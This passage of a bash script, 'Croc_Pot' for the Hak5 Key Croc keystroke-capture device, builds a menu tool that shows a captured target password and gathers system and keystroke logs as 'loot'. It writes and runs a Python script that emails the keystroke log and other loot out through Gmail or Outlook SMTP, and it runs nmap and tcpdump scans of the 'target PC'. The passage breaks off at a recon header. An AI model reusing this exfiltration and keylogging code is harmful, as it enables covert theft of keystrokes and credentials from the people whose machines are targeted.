#!/bin/bash
#
##
# Title:         Croc_Pot
# Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
#                SSH to HAK5 gear, Reverse ssh tunnel, and more
# Author:        Spywill
# Version:       1.5.9
# Category:      Key Croc
##
##
#----Payload  Variables
##
LINE=$(perl -e 'print "=" x 80,"\n"')
LINE_=$(perl -e 'print "*" x 10,"\n"')
LINE_A=$(perl -e 'print "-" x 15,"\n"')
##
#----Create Croc_Pot folders
##
if [[ -d "/root/udisk/loot/Croc_Pot" && "/root/udisk/tools/Croc_Pot" ]]; then
	LED B
else
	mkdir -p /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
fi
##
#----Color  Variables
##
green='\e[40;32m'
blue='\e[40;34m'
red='\e[40;31m'
white='\e[97m'
yellow='\e[40;93m'
clear='\e[0m'
##
#----Color Functions
##
ColorGreen() {
	echo -ne ${green}${1}${clear}
}
ColorBlue() {
	echo -ne ${blue}${1}${clear}
}
ColorYellow() {
	echo -ne ${yellow}${1}${clear}
}
ColorRed() {
	echo -ne ${red}${1}${clear}
}
##
#----All Menu color Functions
##
MenuTitle() {
	echo -ne "\n\t\t\t\e[41;4;1m${*}${clear}\n"
}
MenuColor() {
	echo -ne "\t\t\t\e[40;1m${1}${clear}${green}->${clear}\e[40;38;5;202;4m${@:2}"
}
MenuEnd() {
	echo -ne "\t\t\t\e[40;1m0${clear}${green}->${clear}\e[40;4;32mEXIT           ${array[3]} ${clear} 
\t\t$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]: ')"
	unset m_a
	read m_a
}
Info_Screen() {
	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n${yellow}${*}\n\e[48;5;202;30m${LINE}${clear}\n"
}
##
#----Croc_Pot title function
##
function croc_title() {
##
#----Test internet connection
##
internet_test() {
	ping -q -c 1 -w 1 "8.8.8.8" &>"/dev/null"
if [[ "${?}" -ne 0 ]]; then
	echo -ne "${red}Offline"
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "${green}Online "
fi
}
##
#----Fill in space
##
FILL_IN() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	echo -ne "   "
elif [ "$(OS_CHECK)" = LINUX ]; then
	echo -ne "     "
fi
}
##
#----Croc_Pot title display info
##
	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
${red}${LINE_A}${clear}\e[40m»${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]} ${clear}\e[40m«${clear}${red}---------${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
${red}   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)$(FILL_IN)${clear}
${red}   DATE OF SCAN${clear}\e[40m $(date +%b-%d-%y---%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
${red}${LINE_A}${clear}\e[40;92m»CROC_POT«${red}--${clear}${yellow}VER:1.5.9${red}---${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
\e[41;38;5;232m${LINE}${clear}\n\n"
}
##
#----Croc_Pot title for loot
##
function croc_title_loot() {
	echo -ne "\n${LINE}\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n\t\tDEVELOPED BY SPYWILL\n\t\tDATE OF SCAN-$(date +%b-%d-%y---%r)\n\t${LINE_A}>CROC_POT<${LINE_A}\n${LINE}\n\n"
}
##
#----Croc_Pot invalid entry
##
function invalid_entry() {
	LED R
	echo -ne "\n\t${LINE_}\e[5m$(ColorRed 'INVALID ENTRY PLEASE TRY AGAIN')${LINE_}\n"
	sleep 1
}
##
#----read user input
##
function read_all() {
	unset r_a
	echo -ne "${blue}${*}:${clear}"; read r_a
}
##
#----Check for OS keycroc is pluged into usb
##
function OS_CHECK() {
if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = WINDOWS ]; then
	echo "WINDOWS"
elif [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = LINUX ]; then
	echo "LINUX"
else
	echo "${red}INVALID OS"
fi 2> /dev/null
}
##
#----Array for special characters
##
if [ "$(OS_CHECK)" = WINDOWS ]; then
	array=(5 ♂ ¶ ► ◘ ∞ ☼ ♠ ‼ ↔ ↕ ♫)
elif [ "$(OS_CHECK)" = LINUX ]; then
	array=(❺ ♁ ᛝ ➲ ✉ ∞ ✓ ∵ ✏ ⇆ ♲ ☁)
	HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
else
	array=(5 \# \# \# \# \# \# \# \# \# \# \#)
fi
##
#----Check for target PC ip
##
function os_ip() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
elif [ "$(OS_CHECK)" = LINUX ]; then
	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
fi 2> /dev/null
}
##
#----Check for target pc passwd
##
target_pw() {
if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	echo -ne "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n"
else
	echo -ne "\e[5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')\n"
fi 2> /dev/null
}
##
#----Check for install package option to install
##
function install_package() {
	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "${1}" 2>&1)"
if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
read_all DOWNLOAD AND INSTALL ${2} Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	apt -y install ${1} ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
	${4} ;;
*)
	invalid_entry ; ${3} ;;
esac
fi
}
##
#----KeyCroc Log mean/function
##
function croc_logs_mean() {
	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
	LED B
	croc_title
MenuTitle KEYCROC LOG MENU
echo -ne "\t\t" ; MenuColor 1 MESSAGES LOG | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 8 AUTH LOG | tr -d '\t' ; echo -ne "         ${clear}\n"
echo -ne "\t\t" ; MenuColor 2 KERNEL LOG | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 9 DMESG LOG | tr -d '\t' ; echo -ne "        ${clear}\n"
echo -ne "\t\t" ; MenuColor 3 SYSTEM LOG | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 10 BOOTSTRAP LOG | tr -d '\t' ; echo -ne "   ${clear}\n"
echo -ne "\t\t" ; MenuColor 4 SYSSTAT LOG | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 11 ALTERNATIVES LOG | tr -d '\t' ; echo -ne "${clear}\n"
echo -ne "\t\t" ; MenuColor 5 DEBUG LOG | tr -d '\t' ; echo -ne "    ${clear}" ; MenuColor 12 MAIL INFO LOG | tr -d '\t' ; echo -ne "   ${clear}\n"
echo -ne "\t\t" ; MenuColor 6 DPKG LOG | tr -d '\t' ; echo -ne "     ${clear}" ; MenuColor 13 DAEMON LOG | tr -d '\t' ; echo -ne "      ${clear}\n"
echo -ne "\t\t" ; MenuColor 7 NTPSTATS LOG | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 14 KEYSTROKES LOG | tr -d '\t' ; echo -ne "  ${clear}\n"
MenuColor 15 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
MenuEnd
	case $m_a in
	1) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MESSAGES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/messages | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	2) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KERNEL_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/kern.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	3) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSTEM_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/syslog | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	4) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSSTAT_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/sysstat | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	5) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DEBUG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/debug | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	6) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DPKG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/dpkg.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	7) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}NTPSTATS_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/ntpstats | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	8) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}AUTH_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/auth.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	9) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DMESG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; echo -e "$(dmesg)" | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	10) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}BOOTSTRAP_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/bootstrap.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	11) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}ALTERNATIVES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/alternatives.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	12) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MAIL_INFO_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/mail.info | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	13) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DAEMON_LOG${LINE_}\n" | tee ${LOOT_LOG} ; cat /var/log/daemon.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	14) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KEYSTROKES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /root/udisk/loot/croc_char.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
	15) main_menu ;;
	0) exit 0 ;;
	[bB]) main_menu ;;
	*) invalid_entry ; croc_logs_mean ;;
	esac
}
##
#----Croc mail menu/function
##
function croc_mail() {
	clear
	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
	LED B
	echo -ne "$(Info_Screen '-Send E-Mail with gmail or OutLook
-Select gmail or outlook then Enter e-mail address
-Enter e-mail password then Enter the e-mail to send to
-Add MESSAGE and/or Add Attachment')\n\n"
##
#----User Smtp input Function
##
user_smtp() {
MenuTitle SELECT EMAIL PROVIDER
MenuColor 1 GMAIL ; echo -ne "               ${clear}\n"
MenuColor 2 OUTLOOK ; echo -ne "             ${clear}\n"
MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) local GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;;
	2) local OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;;
	3) main_menu ;;
	0) exit 0 ;;
	*) invalid_entry ; user_smtp ;;
	esac
}
##
#----User E-mail input Function
##
user_email_set() {
##
#----Replace user input with Asterisk (*)
##
user_input_passwd() {
unset password
unset chartCount
echo -n "$(ColorBlue 'ENTER E-MAIL PASSWORD AND PRESS [ENTER]:')"
while IFS= read -r -n1 -s char; do
case "$char" in
$'\0')
	break ;;
$'\177')
	if [ ${#password} -gt 0 ]; then
	echo -ne "\b \b"
	password=${password::-1}
	fi ;;
*)
	chartCount=$((chartCount+1))
	echo -n '*'
	password+="$char" ;;
esac
done
	echo $password >> ${USER_CR}
	echo ""
}
read_all ENTER E-MAIL ADDRESS AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
user_input_passwd
read_all ENTER E-MAIL TO SEND LOOT TO AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
}
##
#----Python file send Function
##
mail_file() {
	clear
python_v() {
	FILE_A_B="file_location_${CHANGE_FILE} ="
	FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
	FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
	FILE_D_B="part_${CHANGE_FILE} = MIMEBase('application', 'octet-stream')"
	FILE_E_B="part_${CHANGE_FILE}.set_payload(attachment_${CHANGE_FILE}.read())"
	FILE_F_B="encoders.encode_base64(part_${CHANGE_FILE})"
	FILE_G_B="part_${CHANGE_FILE}.add_header('Content-Disposition', \"attachment; filename= %s\" % filename_${CHANGE_FILE})"
	FILE_H_B="msg.attach(part_${CHANGE_FILE})"
	FILE_I_B="${CHANGE_FILE_A}"
}
##
#----Mail all file Function
##
send_all_file() {
if [ -e "${1}" ]; then
	local CHANGE_FILE="${2}"
	local CHANGE_FILE_A="'${1}'"
	python_v
	echo -ne "$(ColorGreen 'THIS FILE') ${1} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})"
else
	echo -ne "\n${LINE_}\e[40;31;4;5mPLEASE RUN ${@:3:4} FIRST STARTING ${@:3:4}${clear}${LINE_}\n"
	${5}
fi
}
##
#----Mail Attachment Function
##
send_file_e() {
echo -ne "${blue}ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER]:${clear}"; read s_a
if [ -e "${s_a}" ]; then
	local CHANGE_FILE="P"
	local CHANGE_FILE_A="'${s_a}'"
	python_v
	echo -ne "\n$(ColorGreen 'THIS FILE') ${s_a} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})\n"
else
	echo -ne "\n${LINE_}\e[4;5m$(ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN')${clear}${LINE_}\n"
fi
}
##
#----Mail keystorkes Function
##
send_file_f() {
local KEY_ST=/root/udisk/loot/croc_char.log
if [ -e "${KEY_ST}" ]; then
	local CHANGE_FILE="F"
	local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
	python_v
	echo -ne "$(ColorGreen 'THIS FILE') ${KEY_ST} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})"
else
	echo -ne "\n${LINE_}\e[4;5m$(ColorRed 'DID NOT FIND croc_char.log')${clear}${LINE_}\n"
fi
}
##
#----Croc Mail Select File Menu
##
MenuTitle SELECT FILE TO E-MAIL
MenuColor 1 NMAP SCAN ; echo -ne "           ${clear}\n"
MenuColor 2 KEYCROC LOG ; echo -ne "         ${clear}\n"
MenuColor 3 WINDOW SCAN ; echo -ne "         ${clear}\n"
MenuColor 4 KEYCROC INFO ; echo -ne "        ${clear}\n"
MenuColor 5 ADD ATTACHMENT ; echo -ne "      ${clear}\n"
MenuColor 6 KEYSTORKES LOG ; echo -ne "      ${clear}\n"
MenuColor 7 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt B NMAP SCAN nmap_menu ;;
	2) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt C KEYCROC LOG croc_logs_mean ;;
	3) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt D WINDOWS SCAN croc_pot_plus ;;
	4) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt E KEYCROC STATUS croc_status ;;
	5) send_file_e ;;
	6) send_file_f ;;
	7) main_menu ;;
	0) exit 0 ;;
	*) invalid_entry ; mail_file ;;
	esac
}
##
#----Python E-mail Function
##
python_email() {
	rm ${PYTHON_MAIL} 2> /dev/null
	sleep 1
	echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
from email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '$(sed -n 2p ${USER_CR})'\npassword = '$(sed -n 3p ${USER_CR})'\nsend_to_email = '$(sed -n 4p ${USER_CR})'\n
subject = 'CROC_MAIL'\nmessage = '${r_a}${MY_MESS_A}'\n${FILE_A_B} ${FILE_I_B}\n
msg = MIMEMultipart()\nmsg['From'] = email\nmsg['To'] = send_to_email\nmsg['Subject'] = subject\nmsg.attach(MIMEText(message, 'plain'))\n
${FILE_B_B}\n${FILE_C_B}\n${FILE_D_B}\n${FILE_E_B}\n${FILE_F_B}\n${FILE_G_B}\n
${FILE_H_B}\nserver = smtplib.SMTP('$(sed -n 1p ${USER_CR})', 587)\nserver.starttls()\nserver.login(email, password)\n
text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit()" >> ${PYTHON_MAIL}
	sleep 1
	python ${PYTHON_MAIL}
}
##
#----Mail check for existing email
##
if [ -e "${USER_CR}" ]; then
echo -ne "${yellow}EXISTING E-MAIL${clear} ${green}$(sed -n 2p ${USER_CR})${clear}\n"
read_all USE EXISTING E-MAIL CREDENTIALS Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n${LINE_}$(ColorGreen 'KEEPING EXISTING E-MAIL CREDENTIALS')${LINE_}\n\n" ;;
[nN] | [nN][oO])
	rm ${USER_CR}
	user_smtp
	user_email_set ;;
*)
	invalid_entry ; croc_mail ;;
esac
else
	echo -ne "\n${LINE_}\e[5m$(ColorRed 'NO EXISTING E-MAIL CREDENTIALS WERE FOUND PLEASE ENTER E-MAIL CREDENTIALS')${LINE_}\n\n"
	user_smtp
	user_email_set
fi
##
#----Mail add personal message
##
read_all ENTER A PERSONAL MESSAGE Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	unset MY_MESS_A
	unset DEF_MESS
	read_all ENTER MESSAGE AND PRESS [ENTER] ;;
[nN] | [nN][oO])
	unset r_a
	local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
	local MY_MESS_A=${DEF_MESS} ;;
*)
	invalid_entry ; croc_mail ;;
esac
##
#----Mail add attachment to email
##
echo -ne "${blue}ADD ATTACHMENT Y/N AND PRESS [ENTER]:${clear}"; read a_f
case $a_f in
[yY] | [yY][eE][sS])
	mail_file ;;
[nN] | [nN][oO])
	unset FILE_A_B FILE_B_B FILE_C_B FILE_D_B FILE_E_B FILE_F_B FILE_G_B FILE_H_B FILE_I_B
	echo -ne "\n$(ColorGreen 'SENDING E-MAIL')\n" ;;
*)
	invalid_entry ; mail_file ;;
esac
python_email
main_menu
}
##
#----Croc pot plus menu/function
##
function croc_pot_plus() {
	LED B
	croc_title
##
#----Recon scan menu/Function
##
croc_recon() {
	echo -ne "$(Info_Screen 'Perform some basic recon scan')\n"
##
#----Recon Tcpdump Menu/Function
##
tcpdump_scan() {
	local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
	rm ${LOOT_TCPDUMP}
	echo -ne "$(Info_Screen '-Start some basic Tcpdump scan and save to Loot/Croc_Pot folder
-PRESS CTRL + C TO STOP TCPDUMP SCAN')\n"
MenuTitle TCPDUMP SCAN MENU
MenuColor 1 INTERFACE SCAN ; echo -ne "            ${clear}\n"
MenuColor 2 PACKETS IN HEX AND ASCll ; echo -ne "  ${clear}\n"
MenuColor 3 PACKETS WITH IP ADDRESS ; echo -ne "   ${clear}\n"
MenuColor 4 CURRENT NETWORK INTERFACE ; echo -ne " ${clear}\n"
MenuColor 5 ENTER AN TCPDUMP SCAN ; echo -ne "     ${clear}\n"
MenuColor 6 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
MenuEnd
	case $m_a in
	1) tcpdump -D | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	2) tcpdump -XX -i any | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	3) tcpdump -n -i any | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	4) tcpdump | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	5) read_all ENTER TCPDUMP SCAN THEN PRESS [ENTER] && ${r_a} | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
	6) main_menu ;;
	0) exit 0 ;;
	[bB]) croc_recon ;;
	*) invalid_entry ; tcpdump_scan ;;
	esac
}
##
#----Recon Nmap mean/Function
##
function nmap_menu() {
	local IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
	echo -ne "$(Info_Screen '-Start some basic nmap scan and save to loot folder
-Enter IP for scan or default will be target pc ip')\n\n"
##
#----Nmap User IP Input Function
##
user_ip_f() {
read_all ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]
if [[ "${r_a}" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]]; then
	IP_SETUP=${r_a}
	echo -ne "\t${LINE_}$(ColorGreen 'USING IP THAT WAS ENTER')${r_a}\n"
else
	echo -ne "\t$(ColorRed 'USING TARGET PC IP')$(os_ip)\n"
	IP_SETUP=$(os_ip)
fi
}
##
#----Nmap Target Pc Scan Function
##
pc_scan() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}TARGET PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
elif [ "$(OS_CHECK)" = LINUX ]; then
	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}TARGET PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
else
	echo -ne "\n\t$(ColorRed 'PLEASE RUN CROC_POT_PAYLOAD.txt TO GET TARGET PC USER NAME AND IP')\n"
fi
}
##
#----Nmap Scan Menu
##
LED B
MenuTitle NMAP MENU
MenuColor 1 REGULAR SCAN ; echo -ne "         ${clear}\n"
MenuColor 2 QUICK SCAN ; echo -ne "           ${clear}\n"
MenuColor 3 QUICK PLUS ; echo -ne "           ${clear}\n"
MenuColor 4 PING SCAN ; echo -ne "            ${clear}\n"
MenuColor 5 INTENSE SCAN ; echo -ne "         ${clear}\n"
MenuColor 6 INTERFACE SCAN ; echo -ne "       ${clear}\n"
MenuColor 7 PORT SCAN ; echo -ne "            ${clear}\n"
MenuColor 8 PERSONAL SCAN ; echo -ne "        ${clear}\n"
MenuColor 9 TARGET PC SCAN ; echo -ne "       ${clear}\n"
MenuColor 10 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP REGULAR SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	2) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -F ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	3) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK_PLUS SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sV -T4 -O -F --version-light ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	4) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PING SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sn ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	5) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTENSE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -A -v ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	6) croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --iflist | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	7) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PORT SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --top-ports 20 ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	8) croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; read_all ENTER PERSONAL NMAP SCAN SETTING THEN PRESS [ENTER] && ${r_a} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
	9) pc_scan ; nmap_menu ;;
	10) main_menu ;;
	0) exit 0 ;;
	[bB]) croc_recon ;;
	*) invalid_entry ; nmap_menu ;;
	esac
}
##
#----start all scan Function
##
scan_all() {
	read_all START SCAN Y/N AND PRESS [ENTER]
	case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
	${@:2} ${r_a} ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
	croc_recon ;;
*)
	invalid_entry ; ${@::1} ;;
esac
}
##
#----Recon Traceroute scan Function
##
traceroute_scan() {
	clear
	echo -ne "$(Info_Screen 'Traceroute scan enter IP or web site name')\n\n"
	scan_all traceroute_scan traceroute
}
##
#----Recon Whois lookup scan Function
##
whois_scan() {
	clear
	echo -ne "$(Info_Screen 'Whois Lookup scan enter IP or web site name')\n\n"
	install_package whois WHOIS whois_scan croc_recon
	scan_all whois_scan whois
}
##
#----Recon DNS lookup scan Function
##
dns_scan() {
	clear
	echo -ne "$(Info_Screen 'DNS Lookup scan enter IP or web site name')\n\n"
	install_package dnsutils DNSUTILS dns_scan croc_recon
	scan_all dns_scan dig
}
##
#----Recon Ping scan Function
